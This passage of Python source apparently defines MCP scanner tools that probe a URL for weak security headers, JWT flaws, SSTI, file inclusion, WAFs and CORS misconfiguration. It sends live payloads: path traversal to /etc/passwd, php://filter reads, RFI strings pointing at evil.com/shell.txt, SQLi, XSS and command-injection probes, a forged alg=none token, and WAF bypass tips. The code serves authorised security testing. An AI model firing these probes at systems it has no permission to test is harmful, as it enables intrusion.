                "severity": "HIGH",
                "description": "HSTS - 强制HTTPS连接",
                "recommendation": "添加: Strict-Transport-Security: max-age=31536000; includeSubDomains"
            },
            "X-Content-Type-Options": {
                "severity": "MEDIUM",
                "description": "防止MIME类型嗅探",
                "recommendation": "添加: X-Content-Type-Options: nosniff"
            },
            "X-Frame-Options": {
                "severity": "MEDIUM",
                "description": "防止点击劫持",
                "recommendation": "添加: X-Frame-Options: DENY 或 SAMEORIGIN"
            },
            "X-XSS-Protection": {
                "severity": "LOW",
                "description": "XSS过滤器(已弃用但仍建议)",
                "recommendation": "添加: X-XSS-Protection: 1; mode=block"
            },
            "Content-Security-Policy": {
                "severity": "HIGH",
                "description": "CSP - 防止XSS和数据注入",
                "recommendation": "添加严格的CSP策略"
            },
            "Referrer-Policy": {
                "severity": "LOW",
                "description": "控制Referrer信息泄露",
                "recommendation": "添加: Referrer-Policy: strict-origin-when-cross-origin"
            },
            "Permissions-Policy": {
                "severity": "LOW",
                "description": "控制浏览器功能权限",
                "recommendation": "添加: Permissions-Policy: geolocation=(), microphone=()"
            },
        }

        dangerous_headers = {
            "Server": "泄露服务器信息",
            "X-Powered-By": "泄露技术栈信息",
            "X-AspNet-Version": "泄露ASP.NET版本",
            "X-AspNetMvc-Version": "泄露MVC版本",
        }

        try:
            resp = requests.get(url, timeout=10, verify=get_verify_ssl())
            headers = {k.lower(): v for k, v in resp.headers.items()}

            missing = []
            present = []
            dangerous = []

            for header, info in security_headers.items():
                if header.lower() not in headers:
                    missing.append({
                        "header": header,
                        "severity": info["severity"],
                        "description": info["description"],
                        "recommendation": info["recommendation"]
                    })
                else:
                    present.append({
                        "header": header,
                        "value": headers[header.lower()],
                        "status": "OK"
                    })

            for header, desc in dangerous_headers.items():
                if header.lower() in headers:
                    dangerous.append({
                        "header": header,
                        "value": headers[header.lower()],
                        "description": desc,
                        "severity": "LOW",
                        "recommendation": f"移除或隐藏 {header} 头"
                    })

            cookie_issues = []
            set_cookie = resp.headers.get("Set-Cookie", "")
            if set_cookie:
                if "httponly" not in set_cookie.lower():
                    cookie_issues.append({
                        "issue": "Missing HttpOnly",
                        "severity": "MEDIUM",
                        "description": "Cookie缺少HttpOnly标志，可能被XSS窃取"
                    })
                if "secure" not in set_cookie.lower() and url.startswith("https"):
                    cookie_issues.append({
                        "issue": "Missing Secure",
                        "severity": "MEDIUM",
                        "description": "Cookie缺少Secure标志，可能通过HTTP泄露"
                    })
                if "samesite" not in set_cookie.lower():
                    cookie_issues.append({
                        "issue": "Missing SameSite",
                        "severity": "LOW",
                        "description": "Cookie缺少SameSite标志，可能受CSRF攻击"
                    })

            score = 100
            for m in missing:
                if m["severity"] == "HIGH":
                    score -= 15
                elif m["severity"] == "MEDIUM":
                    score -= 10
                else:
                    score -= 5
            for d in dangerous:
                score -= 5
            for c in cookie_issues:
                if c["severity"] == "MEDIUM":
                    score -= 10
                else:
                    score -= 5
            score = max(0, score)

        except Exception as e:
            return {"success": False, "error": str(e)}

        return {
            "success": True,
            "url": url,
            "security_score": score,
            "grade": "A" if score >= 90 else "B" if score >= 70 else "C" if score >= 50 else "D" if score >= 30 else "F",
            "missing_headers": missing,
            "present_headers": present,
            "dangerous_headers": dangerous,
            "cookie_issues": cookie_issues,
            "summary": f"缺失 {len(missing)} 个安全头，发现 {len(dangerous)} 个信息泄露头"
        }

    @mcp.tool()
    def jwt_vuln_detect(url: str, token: str = None) -> dict:
        """JWT漏洞检测 - 检测JWT认证相关漏洞 (A01/A07)"""
        if not HAS_REQUESTS:
            return {"success": False, "error": "需要安装 requests: pip install requests"}

        findings = []
        jwt_info = None

        def decode_jwt(token):
            try:
                parts = token.split('.')
                if len(parts) != 3:
                    return None

                def b64_decode(data):
                    padding = 4 - len(data) % 4
                    if padding != 4:
                        data += '=' * padding
                    return base64.urlsafe_b64decode(data)

                header = json.loads(b64_decode(parts[0]))
                payload = json.loads(b64_decode(parts[1]))

                return {"header": header, "payload": payload, "signature": parts[2]}
            except Exception:
                return None

        try:
            if not token:
                resp = requests.get(url, timeout=10, verify=get_verify_ssl())

                auth_header = resp.headers.get("Authorization", "")
                if auth_header.startswith("Bearer "):
                    token = auth_header[7:]

                for name, value in resp.cookies.items():
                    if value.count('.') == 2 and len(value) > 50:
                        decoded = decode_jwt(value)
                        if decoded:
                            token = value
                            findings.append({
                                "type": "JWT in Cookie",
                                "cookie_name": name,
                                "severity": "INFO"
                            })
                            break

                if not token and "eyJ" in resp.text:
                    jwt_pattern = r'eyJ[A-Za-z0-9_-]*\.eyJ[A-Za-z0-9_-]*\.[A-Za-z0-9_-]*'
                    matches = re.findall(jwt_pattern, resp.text)
                    if matches:
                        token = matches[0]

            if token:
                jwt_info = decode_jwt(token)

                if jwt_info:
                    header = jwt_info["header"]
                    payload = jwt_info["payload"]

                    alg = header.get("alg", "").upper()
                    if alg == "NONE":
                        findings.append({
                            "type": "Algorithm None",
                            "severity": "CRITICAL",
                            "description": "JWT使用none算法，签名可被绕过"
                        })
                    elif alg in ["HS256", "HS384", "HS512"]:
                        findings.append({
                            "type": "Symmetric Algorithm",
                            "algorithm": alg,
                            "severity": "MEDIUM",
                            "description": "使用对称加密，可能存在密钥爆破风险"
                        })

                    sensitive_keys = ["password", "pwd", "secret", "key", "token", "credit", "ssn"]
                    for key in payload.keys():
                        if any(s in key.lower() for s in sensitive_keys):
                            findings.append({
                                "type": "Sensitive Data in Payload",
                                "key": key,
                                "severity": "HIGH",
                                "description": f"JWT payload包含敏感字段: {key}"
                            })

                    exp = payload.get("exp")
                    if not exp:
                        findings.append({
                            "type": "No Expiration",
                            "severity": "MEDIUM",
                            "description": "JWT没有设置过期时间"
                        })
                    elif exp < time.time():
                        findings.append({
                            "type": "Expired Token",
                            "severity": "INFO",
                            "description": "JWT已过期但仍在使用"
                        })

                    if "jku" in header:
                        findings.append({
                            "type": "JKU Header Present",
                            "value": header["jku"],
                            "severity": "HIGH",
                            "description": "存在jku头，可能存在密钥注入漏洞"
                        })
                    if "x5u" in header:
                        findings.append({
                            "type": "X5U Header Present",
                            "value": header["x5u"],
                            "severity": "HIGH",
                            "description": "存在x5u头，可能存在证书注入漏洞"
                        })

                    if "kid" in header:
                        findings.append({
                            "type": "KID Header Present",
                            "value": header["kid"],
                            "severity": "MEDIUM",
                            "description": "存在kid头，测试SQL注入/路径遍历"
                        })

                    try:
                        none_header = base64.urlsafe_b64encode(json.dumps({"alg": "none", "typ": "JWT"}).encode()).decode().rstrip('=')
                        none_payload = base64.urlsafe_b64encode(json.dumps(payload).encode()).decode().rstrip('=')
                        none_token = f"{none_header}.{none_payload}."

                        test_resp = requests.get(url, headers={"Authorization": f"Bearer {none_token}"}, timeout=5, verify=get_verify_ssl())
                        if test_resp.status_code != 401:
                            findings.append({
                                "type": "Algorithm Confusion",
                                "severity": "CRITICAL",
                                "description": "服务器接受none算法JWT，存在认证绕过"
                            })
                    except Exception:
                        pass

        except Exception as e:
            return {"success": False, "error": str(e)}

        return {
            "success": True,
            "url": url,
            "jwt_found": token is not None,
            "jwt_info": jwt_info,
            "vulnerable": any(f["severity"] in ["CRITICAL", "HIGH"] for f in findings),
            "findings": findings,
            "recommendations": [
                "使用RS256等非对称算法",
                "设置合理的过期时间",
                "不在payload中存储敏感信息",
                "验证alg头，拒绝none算法",
                "使用强密钥(至少256位)"
            ] if findings else []
        }

    @mcp.tool()
    def ssti_detect(url: str, param: str = None) -> dict:
        """SSTI模板注入检测 - 检测服务端模板注入漏洞"""
        if not HAS_REQUESTS:
            return {"success": False, "error": "需要安装 requests: pip install requests"}

        findings = []

        payloads = {
            "jinja2": [
                ("{{7*7}}", "49"),
                ("{{config}}", "Config"),
                ("{{self.__class__}}", "class"),
            ],
            "twig": [
                ("{{7*7}}", "49"),
                ("{{_self.env}}", "Environment"),
            ],
            "freemarker": [
                ("${7*7}", "49"),
                ("${.version}", "version"),
            ],
            "velocity": [
                ("#set($x=7*7)$x", "49"),
            ],
            "smarty": [
                ("{$smarty.version}", "Smarty"),
                ("{7*7}", "49"),
            ],
            "mako": [
                ("${7*7}", "49"),
            ],
            "erb": [
                ("<%=7*7%>", "49"),
            ],
            "thymeleaf": [
                ("[[${7*7}]]", "49"),
            ],
        }

        try:
            parsed = urlparse(url)
            base_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}"

            params = []
            if param:
                params = [param]
            elif parsed.query:
                params = [p.split('=')[0] for p in parsed.query.split('&') if '=' in p]

            if not params:
                params = ["q", "search", "query", "name", "input", "template", "page", "view"]

            for p in params[:5]:
                for engine, tests in payloads.items():
                    for payload, expected in tests:
                        try:
                            test_url = f"{base_url}?{p}={requests.utils.quote(payload)}"
                            resp = requests.get(test_url, timeout=10, verify=get_verify_ssl())

                            if expected in resp.text:
                                findings.append({
                                    "type": "SSTI",
                                    "engine": engine,
                                    "param": p,
                                    "payload": payload,
                                    "severity": "CRITICAL",
                                    "detail": f"检测到{engine}模板注入"
                                })
                                break
                        except Exception:
                            pass

        except Exception as e:
            return {"success": False, "error": str(e)}

        return {
            "success": True,
            "url": url,
            "vulnerable": len(findings) > 0,
            "ssti_vulns": findings,
            "recommendations": [
                "避免将用户输入直接传入模板引擎",
                "使用沙箱模式渲染模板",
                "对用户输入进行严格过滤"
            ] if findings else []
        }

    @mcp.tool()
    def lfi_detect(url: str, param: str = None) -> dict:
        """LFI/RFI文件包含检测 - 检测本地/远程文件包含漏洞"""
        if not HAS_REQUESTS:
            return {"success": False, "error": "需要安装 requests: pip install requests"}

        findings = []

        lfi_payloads = [
            ("../../../etc/passwd", "root:"),
            ("....//....//....//etc/passwd", "root:"),
            ("..%2f..%2f..%2fetc/passwd", "root:"),
            ("..%252f..%252f..%252fetc/passwd", "root:"),
            ("/etc/passwd", "root:"),
            ("....\\....\\....\\windows\\win.ini", "[fonts]"),
            ("..\\..\\..\\windows\\win.ini", "[fonts]"),
            ("C:\\windows\\win.ini", "[fonts]"),
            ("php://filter/convert.base64-encode/resource=index.php", "PD9waHA"),
            ("php://filter/read=string.rot13/resource=index.php", "<?cuc"),
        ]

        rfi_payloads = [
            "http://evil.com/shell.txt",
            "https://evil.com/shell.txt",
            "//evil.com/shell.txt",
        ]

        try:
            parsed = urlparse(url)
            base_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}"

            params = []
            if param:
                params = [param]
            elif parsed.query:
                params = [p.split('=')[0] for p in parsed.query.split('&') if '=' in p]

            if not params:
                params = ["file", "page", "include", "path", "doc", "document", "folder", "root", "pg", "style", "template", "php_path", "lang"]

            for p in params[:5]:
                for payload, indicator in lfi_payloads:
                    try:
                        test_url = f"{base_url}?{p}={requests.utils.quote(payload)}"
                        resp = requests.get(test_url, timeout=10, verify=get_verify_ssl())

                        if indicator in resp.text:
                            findings.append({
                                "type": "LFI",
                                "param": p,
                                "payload": payload,
                                "severity": "CRITICAL",
                                "detail": "本地文件包含漏洞"
                            })
                            break
                    except Exception:
                        pass

                for payload in rfi_payloads:
                    try:
                        test_url = f"{base_url}?{p}={requests.utils.quote(payload)}"
                        resp = requests.get(test_url, timeout=5, verify=get_verify_ssl())

                        if "evil.com" in resp.text or "failed to open stream" in resp.text:
                            findings.append({
                                "type": "RFI_Potential",
                                "param": p,
                                "payload": payload,
                                "severity": "HIGH",
                                "detail": "可能存在远程文件包含漏洞"
                            })
                            break
                    except Exception:
                        pass

        except Exception as e:
            return {"success": False, "error": str(e)}

        return {
            "success": True,
            "url": url,
            "vulnerable": len(findings) > 0,
            "lfi_vulns": findings,
            "recommendations": [
                "使用白名单限制可包含的文件",
                "禁用allow_url_include",
                "对文件路径进行严格过滤"
            ] if findings else []
        }

    @mcp.tool()
    def waf_detect(url: str) -> dict:
        """WAF检测 - 识别目标使用的Web应用防火墙"""
        if not HAS_REQUESTS:
            return {"success": False, "error": "需要安装 requests: pip install requests"}

        waf_signatures = {
            "Cloudflare": {
                "headers": ["cf-ray", "cf-cache-status", "__cfduid"],
                "body": ["cloudflare", "attention required"],
                "cookies": ["__cfduid", "cf_clearance"]
            },
            "AWS WAF": {
                "headers": ["x-amzn-requestid", "x-amz-cf-id"],
                "body": ["aws", "amazon"]
            },
            "Akamai": {
                "headers": ["akamai", "x-akamai"],
                "body": ["akamai", "reference #"]
            },
            "ModSecurity": {
                "headers": ["mod_security", "modsecurity"],
                "body": ["mod_security", "modsecurity", "not acceptable"]
            },
            "Imperva/Incapsula": {
                "headers": ["x-iinfo", "x-cdn"],
                "cookies": ["incap_ses", "visid_incap"]
            },
            "F5 BIG-IP": {
                "headers": ["x-wa-info"],
                "cookies": ["bigipserver", "ts"]
            },
            "Sucuri": {
                "headers": ["x-sucuri-id", "x-sucuri-cache"],
                "body": ["sucuri", "cloudproxy"]
            },
            "阿里云WAF": {
                "headers": ["ali-swift-global-savetime"],
                "body": ["aliyun", "errors.aliyun.com"]
            },
            "腾讯云WAF": {
                "headers": ["tencent"],
                "body": ["waf.tencent-cloud.com"]
            },
        }

        detected_wafs = []
        test_results = {}

        try:
            normal_resp = requests.get(url, timeout=10, verify=get_verify_ssl())
            test_results["normal"] = {
                "status": normal_resp.status_code,
                "headers": dict(normal_resp.headers)
            }

            malicious_payloads = [
                "?id=1' OR '1'='1",
                "?id=<script>alert(1)</script>",
                "?id=../../../etc/passwd",
                "?id=;cat /etc/passwd",
            ]

            for payload in malicious_payloads:
                try:
                    mal_resp = requests.get(url + payload, timeout=10, verify=get_verify_ssl())
                    test_results[f"malicious_{payload[:20]}"] = mal_resp.status_code
                except Exception:
                    pass

            headers_lower = {k.lower(): v.lower() for k, v in normal_resp.headers.items()}
            body_lower = normal_resp.text.lower()
            cookies = normal_resp.cookies.get_dict()

            for waf_name, signatures in waf_signatures.items():
                confidence = 0

                for h in signatures.get("headers", []):
                    if h.lower() in headers_lower:
                        confidence += 40

                for b in signatures.get("body", []):
                    if b.lower() in body_lower:
                        confidence += 30

                for c in signatures.get("cookies", []):
                    if c.lower() in [k.lower() for k in cookies.keys()]:
                        confidence += 30

                if confidence >= 30:
                    detected_wafs.append({
                        "waf": waf_name,
                        "confidence": min(confidence, 100),
                        "evidence": "Header/Body/Cookie匹配"
                    })

            if normal_resp.status_code == 200:
                for payload in malicious_payloads:
                    try:
                        mal_resp = requests.get(url + payload, timeout=10, verify=get_verify_ssl())
                        if mal_resp.status_code in [403, 406, 429, 503]:
                            if not detected_wafs:
                                detected_wafs.append({
                                    "waf": "Unknown WAF",
                                    "confidence": 60,
                                    "evidence": f"恶意请求被拦截 (HTTP {mal_resp.status_code})"
                                })
                            break
                    except Exception:
                        pass

        except Exception as e:
            return {"success": False, "error": str(e)}

        bypass_tips = []
        if detected_wafs:
            bypass_tips = [
                "尝试大小写混淆: SeLeCt, UnIoN",
                "使用编码绕过: URL编码, Unicode编码",
                "使用注释混淆: /**/SELECT/**/",
                "使用等价函数替换",
                "分块传输编码绕过",
                "HTTP参数污染",
            ]

        return {
            "success": True,
            "url": url,
            "waf_detected": len(detected_wafs) > 0,
            "detected_wafs": detected_wafs,
            "bypass_tips": bypass_tips,
            "test_results": test_results
        }

    @mcp.tool()
    def cors_deep_check(url: str) -> dict:
        """CORS深度检测 - 检测跨域资源共享配置漏洞"""
        if not HAS_REQUESTS:
            return {"success": False, "error": "需要安装 requests: pip install requests"}

        findings = []

        test_origins = [
            "https://evil.com",
            "https://attacker.com",
            "null",
            "https://target.com.evil.com",
            url.replace("https://", "https://evil.").replace("http://", "http://evil."),
        ]

        try:
            requests.get(url, timeout=10, verify=get_verify_ssl())

            for origin in test_origins:
                try:
                    headers = {"Origin": origin}
                    resp = requests.get(url, headers=headers, timeout=10, verify=get_verify_ssl())

                    acao = resp.headers.get("Access-Control-Allow-Origin", "")
                    acac = resp.headers.get("Access-Control-Allow-Credentials", "")

                    if acao == "*":
                        findings.append({
                            "type": "Wildcard Origin",
                            "origin": origin,
                            "acao": acao,
                            "severity": "MEDIUM",
                            "detail": "允许任意来源访问"
                        })
                    elif acao == origin:
                        severity = "HIGH" if acac.lower() == "true" else "MEDIUM"
                        findings.append({
                            "type": "Origin Reflection",
                            "origin": origin,
                            "acao": acao,
                            "acac": acac,
                            "severity": severity,
                            "detail": "反射任意Origin" + ("且允许携带凭证" if acac.lower() == "true" else "")
                        })
                    elif origin == "null" and acao == "null":
                        findings.append({
                            "type": "Null Origin Allowed",
                            "severity": "HIGH",
                            "detail": "允许null来源，可通过iframe沙箱利用"
                        })

                except Exception:
                    pass

        except Exception as e:
            return {"success": False, "error": str(e)}

        return {
            "success": True,
            "url": url,
            "vulnerable": len(findings) > 0,
            "cors_vulns": findings,
            "recommendations": [
                "使用白名单验证Origin",
                "避免反射任意Origin",
                "谨慎使用Access-Control-Allow-Credentials",
                "不要允许null来源"
            ] if findings else []
        }

    # 返回注册的工具列表
    return [
        "vuln_check", "sqli_detect", "xss_detect", "csrf_detect", "ssrf_detect",
        "cmd_inject_detect", "xxe_detect", "idor_detect", "file_upload_detect",
        "auth_bypass_detect", "logic_vuln_check", "deserialize_detect",
        "weak_password_detect", "security_headers_check", "jwt_vuln_detect",
        "ssti_detect", "lfi_detect", "waf_detect", "cors_deep_check"
    ]
